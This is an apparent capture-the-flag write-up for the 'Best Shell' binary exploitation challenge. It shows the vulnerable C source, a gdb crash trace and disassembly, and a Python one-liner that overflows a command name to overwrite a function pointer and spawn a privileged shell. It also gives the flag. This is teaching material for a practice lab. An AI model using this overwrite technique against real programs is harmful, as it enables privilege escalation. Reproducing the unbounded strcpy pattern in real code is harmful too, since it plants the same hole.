### Solved by superkojiman

Best Shell is a 160 point binary exploitation challenge. 

> This shell is super useful! See if you can get the flag! The binary can be found at /home/best_shell/ on the shell server. The source can be downloaded here.

Here's the source code:

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#define NUMHANDLERS 6

typedef struct input_handler {
    char cmd[32];
    void (*handler)(char *);
} input_handler;

bool admin = false;
char admin_password[64];
input_handler handlers[NUMHANDLERS];

input_handler *find_handler(char *cmd){
    int i;
    for(i = 0; i < NUMHANDLERS; i++){
        if (!strcmp(handlers[i].cmd, cmd)){
            return &handlers[i];
        }
    }

    return NULL;
}

void lol_handler(char *arg){
    if (arg == NULL){
        printf("usage: lol [string]\n");
        return;
    }

    printf("lol %s\n", arg);
}

void add_handler(char *arg){
    int arg1;
    int arg2;

    if (arg == NULL){
        printf("usage: add [num1] [num2]\n");
        return;
    }

    sscanf(arg, "%d %d", &arg1, &arg2);

    printf("= %d\n", arg1 + arg2);
}

void mult_handler(char * arg){
    int arg1;
    int arg2;

    if (arg == NULL){
        printf("usage: mult [num1] [num2]\n");
        return;
    }

    sscanf(arg, "%d %d", &arg1, &arg2);

    printf("= %d\n", arg1 * arg2);
}

void rename_handler(char *arg){
    char *existing;
    char *new;

    if (arg == NULL){
        printf("usage: rename [cmd_name] [new_name]\n");
        return;
    }

    existing = strtok(arg, " ");
    new = strtok(NULL, "");

    if (new == NULL){
        printf("usage: rename [cmd_name] [new_name]\n");
        return;
    }

    input_handler *found = find_handler(existing);

    if (found != NULL){
        strcpy(found->cmd, new);
    }else{
        printf("No command found.\n");
    }
}

void auth_admin_handler(char *arg){
    if (arg == NULL){
        printf("usage: auth [password]\n");
        return;
    }

    if (!strcmp(arg, admin_password)){
        admin = true;
        printf("You are now admin!\n");
    }else{
        printf("Incorrect password!\n");
    }
}

void shell_handler(char *arg){
    if (admin){
        gid_t gid = getegid();
        setresgid(gid, gid, gid);
        system("/bin/sh");
    }else{
        printf("You must be admin!\n");
    }
}

void setup_handlers(){
    handlers[0] = (input_handler){"shell", shell_handler};
    handlers[1] = (input_handler){"auth", auth_admin_handler};
    handlers[2] = (input_handler){"rename", rename_handler};
    handlers[3] = (input_handler){"add", add_handler};
    handlers[4] = (input_handler){"mult", mult_handler};
    handlers[5] = (input_handler){"lol", lol_handler};
}

void input_loop(){
    char input_buf[128];
    char *cmd;
    char *arg;
    input_handler *handler;

    printf(">> ");
    fflush(stdout);
    while(fgets(input_buf, 128, stdin)){
        cmd = strtok(input_buf, " \n");
        arg  = strtok(NULL, "\n");

         handler = find_handler(cmd);

         if (handler != NULL){
             handler->handler(arg);
         }else{
             printf("Command \"%s\" not found!\n", cmd);
         }

        printf(">> ");
        fflush(stdout);
    }
}

int main(int argc, char **argv){
    FILE *f = fopen("/home/best_shell/password.txt","r");
    if (f == NULL){
        printf("Cannot open password file");
        exit(1);
    }

    fgets(admin_password, 64, f);
    admin_password[strcspn(admin_password, "\n")] = '\0';
    fclose(f);

    setup_handlers();
    input_loop();

    return 0;
}
```

This program accepts the following commands: shell, auth, rename, add, mult, and lol. Out of all these, the rename command allows us to overwrite the function pointer handler defined here:

```c
typedef struct input_handler {
    char cmd[32];
    void (*handler)(char *);
} input_handler;
```

The rename command allows us to rename an existing command to whatever we like. There is no bounds checking done, which means if we provide more than 32 bytes for the new name, we can overwrite the funcion pointer handler with whatever address we like. Let's see it in action: 

```text
# gdb -q best_shell
Reading symbols from /root/pico-ctf/bestshell/best_shell...(no debugging symbols found)...done.
gdb-peda$ r
>> rename lol AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
>> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x42424242 ('BBBB')
EBX: 0xb7767ff4 --> 0x160d7c 
ECX: 0x10 
EDX: 0x0 
ESI: 0x0 
EDI: 0x0 
EBP: 0xbfe19938 --> 0xbfe19968 --> 0xbfe199e8 --> 0x0 
ESP: 0xbfe1988c --> 0x8048c31 (<input_loop+121>:    jmp    0x8048c46 <input_loop+142>)
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xbfe1988c --> 0x8048c31 (<input_loop+121>:   jmp    0x8048c46 <input_loop+142>)
0004| 0xbfe19890 --> 0x0 
0008| 0xbfe19894 --> 0x8048ea5 --> 0x6f43000a ('\n')
0012| 0xbfe19898 --> 0xb7768440 --> 0xfbad2288 
0016| 0xbfe1989c --> 0xa00d008 --> 0x0 
0020| 0xbfe198a0 --> 0xbfe198b8 ('A' <repeats 12 times>, "BBBB")
0024| 0xbfe198a4 ('A' <repeats 32 times>, "BBBB")
0028| 0xbfe198a8 ('A' <repeats 28 times>, "BBBB")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$ 
```

It worked! I renamed the lol command to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB which overwrote the function pointer handler with the address 0x42424242. When I called the renamed lol command, it attempted to execute the instruction at 0x42424242. All we need to do is point it to an address we want, in this case, the shell command which should give us a shell on the server. Finding the address of shell_handler() is a matter of just disassembling it in gdb on the server:

```
(gdb) disas shell_handler
Dump of assembler code for function shell_handler:
   0x080489c6 <+0>: push   %ebp
   0x080489c7 <+1>: mov    %esp,%ebp
   0x080489c9 <+3>: sub    $0x28,%esp
   0x080489cc <+6>: movzbl 0x804b085,%eax
   0x080489d3 <+13>:    test   %al,%al
   0x080489d5 <+15>:    je     0x8048a06 <shell_handler+64>
   0x080489d7 <+17>:    call   0x8048600 <getegid@plt>
   0x080489dc <+22>:    mov    %eax,-0xc(%ebp)
   0x080489df <+25>:    mov    -0xc(%ebp),%eax
   0x080489e2 <+28>:    mov    %eax,0x8(%esp)
   0x080489e6 <+32>:    mov    -0xc(%ebp),%eax
   0x080489e9 <+35>:    mov    %eax,0x4(%esp)
   0x080489ed <+39>:    mov    -0xc(%ebp),%eax
   0x080489f0 <+42>:    mov    %eax,(%esp)
   0x080489f3 <+45>:    call   0x80486a0 <setresgid@plt>
   0x080489f8 <+50>:    movl   $0x8048ea3,(%esp)
   0x080489ff <+57>:    call   0x8048630 <system@plt>
   0x08048a04 <+62>:    jmp    0x8048a12 <shell_handler+76>
   0x08048a06 <+64>:    movl   $0x8048eab,(%esp)
   0x08048a0d <+71>:    call   0x8048620 <puts@plt>
   0x08048a12 <+76>:    leave
   0x08048a13 <+77>:    ret
End of assembler dump.
```

However we don't want to jump into it directly since it first checks to see if we've authenticated successfully, and we haven't. So we'll set the address at 0x080489d7, which is the call to getegid(). The exploit then is to rename a command with 32 "A"s, followed by the address 0x080489d7, and then call that renamed function. 

```
pico1139@shell:~$ python -c 'import struct; print "rename lol " + "A"*32 + struct.pack("<I", 0x80489d7) + "\n" + "A"*32 + struct.pack("<I", 0x80489d7)' > in.txt
```

We just need to pipe in.txt into best_shell to get our shell: 

```
pico1139@shell:~$ cd /home/best_shell/
pico1139@shell:/home/best_shell$ id
uid=11066(pico1139) gid=1017(picogroup) groups=1017(picogroup)
pico1139@shell:/home/best_shell$ (cat /home_users/pico1139/in.txt ; cat) | ./best_shell
>> >> id
uid=11066(pico1139) gid=1010(best_shell) groups=1017(picogroup)
cat flag.txt
give_shell_was_useful
```

The flag is **give_shell_was_useful**
